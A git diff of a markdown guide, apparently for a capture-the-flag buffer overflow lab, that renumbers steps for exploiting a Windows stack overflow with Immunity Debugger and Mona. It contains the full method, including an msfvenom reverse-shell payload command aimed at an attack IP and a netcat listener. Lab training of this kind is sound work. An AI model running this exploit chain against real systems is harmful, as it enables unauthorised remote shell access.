@@ -5,11 +5,11 @@ Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.
 Note: Bracket characters themselves [ ] require removal. See examples.
 *********************************************************************************
 
-### Step 1: Ensure Mona is installed in Immunity Debugger
+* Step 1: Ensure Mona is installed in Immunity Debugger
 
-### Step 2: Launch Immunity Debugger, open relevant application, and run the application
+* Step 2: Launch Immunity Debugger, open relevant application, and run the application
 
-### Step 3: Configure working folder with this command at the bottom of Immunity Debugger:
+* Step 3: Configure working folder with this command at the bottom of Immunity Debugger:
 
 ```
 !mona config -set workingfolder [FILE-PATH]
@@ -21,7 +21,7 @@ Example:
 !mona config -set workingfolder c:\mona\%p
 ```
 
-### Step 4: Fuzz the application; Note the length of string that is needed to crash the application
+* Step 4: Fuzz the application; Note the length of string that is needed to crash the application
 
 Example Python Code for Fuzzing:
 
@@ -54,7 +54,7 @@ while True:
   time.sleep(1)
   ```
   
- ### Step 5: Create exploit.py skeleton:
+* Step 5: Create exploit.py skeleton:
  
  Example exploit.py :
  
@@ -85,32 +85,33 @@ except:
   print("Could not connect.")
   ```
   
-### Step 5: Generate cyclic pattern with this command:
+* Step 6: Generate cyclic pattern with this command:
 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [PATTERN-LENGTH]
 ```
 *Make PATTERN-LENGTH 400 bytes longer than the string that crashed the application while fuzzing*
+
  
- ### Step 6: Paste output from Step 5 into payload variable of exploit.py
+* Step 7: Paste output from Step 5 into payload variable of exploit.py
  
- ### Step 7: Restart application in Immunity, Run exploit.py from attack machine
+* Step 8: Restart application in Immunity, Run exploit.py from attack machine
  
- ### Step 8: After exploit.py crashes the application, run this command in Immunity to determine offset:
+* Step 9: After exploit.py crashes the application, run this command in Immunity to determine offset:
  
  ```
  !mona findmsp -distance [PATTERN-LENGTH]
  ```
  
- ### Step 9: Paste offset amount into the offset variable of exploit.py
+* Step 10: Paste offset amount into the offset variable of exploit.py
  
- ### Step 10: Set retn variable to "BBBB" in exploit.py
+* Step 11: Set retn variable to "BBBB" in exploit.py
  
- ### Step 11: Restart Application; Run exploit.py
+* Step 12: Restart Application; Run exploit.py
  
- ### Step 12: Ensure EIP is under control (EIP should have: 42424242)
+* Step 13: Ensure EIP is under control (EIP should have: 42424242)
  
- ### Step 13: Create script to help generate bad characters
+* Step 14: Create script to help generate bad characters
 
 Example:
 
@@ -120,58 +121,58 @@ for x in range(1, 256):
 print()
 ```
 
-### Step 14: Run Bad Characters Script
+* Step 15: Run Bad Characters Script
 
-### Step 15: Paste Bad Characters output into payload variable of exploit.py
+* Step 16: Paste Bad Characters output into payload variable of exploit.py
 
-### Step 16: Re-open application in Immunity but do not run it
+* Step 17: Re-open application in Immunity but do not run it
 
-### Step 17: Generate byte array in Immunity with this command:
+* Step 18: Generate byte array in Immunity with this command:
 
 ```
 !mona bytearray -b "\x00"
 ```
 
-### Step 18: Start application in Immunity; Run exploit.py on attack machine
+* Step 19: Start application in Immunity; Run exploit.py on attack machine
 
-### Step 19: Compare byte array with this command in Immunity to see possible bad characters:
+* Step 20: Compare byte array with this command in Immunity to see possible bad characters:
 
 ```
 !mona compare -f C:\mona\oscp\bytearray.bin -a [ESP-ADDRESS]
 ```
 
-### Step 19: Remove first bad character in the list in Step 19 from payload variable in exploit.py
+* Step 21: Remove first bad character in the list in Step 19 from payload variable in exploit.py
 
-### Step 20: Reopen Application but do not run it
+* Step 22: Reopen Application but do not run it
 
-### Step 21: Generate byte array again in Immunity with same command as last time, but make sure you add the bad character to the exception list
+* Step 23: Generate byte array again in Immunity with same command as last time, but make sure you add the bad character to the exception list
 
 Example:
 ```
 !mona bytearray -b "\x00\x07"
 ```
 
-### Step 22: Repeat steps 18-21 until Step 19 says "Unmodified" in the Immunity logs (These are the bad characters)
+* Step 24: Repeat steps 18-21 until Step 19 says "Unmodified" in the Immunity logs (These are the bad characters)
 
-### Step 23: In crashed or running state, find jump point in Immunity with this command:
+* Step 25: In crashed or running state, find jump point in Immunity with this command:
 
 ```
 !mona jmp -r esp -cpb [BAD-CHARACTERS]
 ```
 
-### Step 24: Write jump point address discovered backwards into the retn variable of exploit.py
+* Step 26: Write jump point address discovered backwards into the retn variable of exploit.py
 
 For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in exploit.py
 
-### Step 25: Generate payload with this command:
+* Step 27: Generate payload with this command:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=4444 EXITFUNC=thread -b "[BAD-CHARACTORS]" -f c
 ```
 
-### Step 26: Paste generated payload into payload variable of exploit.py
+* Step 28: Paste generated payload into payload variable of exploit.py
 
-### Step 27: Add padding to exploit.py
+* Step 29: Add padding to exploit.py
 
 Example:
 
@@ -179,17 +180,17 @@ Example:
 padding = "\x90" * 16
 ```
 
-### Step 28: Start netcat listener
+* Step 30: Start netcat listener
 
 Example:
 ```
 nc -lnvp 4444
 ```
 
-### Step 29: Restart application in Immunity, Run it, and run exploit.py from attack machine
+* Step 31: Restart application in Immunity, Run it, and run exploit.py from attack machine
 
-### Step 30: Check listener, it should have a shell
+* Step 32: Check listener, it should have a shell
 
-## References
+## Reference
 
 * https://tryhackme.com/room/bufferoverflowprep#
